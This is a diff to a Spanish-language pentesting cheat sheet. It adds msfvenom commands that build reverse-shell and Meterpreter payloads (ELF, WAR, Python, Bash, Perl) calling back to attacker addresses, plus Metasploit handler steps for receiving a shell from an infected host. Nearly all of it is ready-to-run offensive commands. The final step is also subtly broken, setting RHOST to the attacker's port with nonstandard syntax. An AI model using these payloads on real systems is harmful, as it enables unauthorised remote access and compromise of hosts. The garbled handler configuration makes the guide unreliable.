@@ -84,6 +84,7 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacan
 </b>
 
 <b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>
+<b>
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 
@@ -99,5 +100,30 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > 
 msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
 msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
 msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.1.222 lport=1234 -f elf -o origen_shell
 ```
+</b>
 
+- <b>Paso 4</b>: Volviendo a Metasploit Framework, configuramos el payload con el que se va a realizar la escucha, es decir, con el que realmente se ha infectado al host objetivo.
+<b>
+
+```
+# Para un sistema de 64 bits
+set payload windows/x64/meterpreter/reverse_tcp
+```
+```
+# Para un sistema de 32 bits
+set payload windows/meterpreter/reverse_tcp
+```
+</b>
+
+- <b>Paso 5</b>: Posteriomente, se configuran la ip y puerto del atacante (escucha)
+<b>
+
+```
+set LHOST=[ip_atacante]
+```
+```
+set RHOST=[puerto_atacante]
+```
+</b>
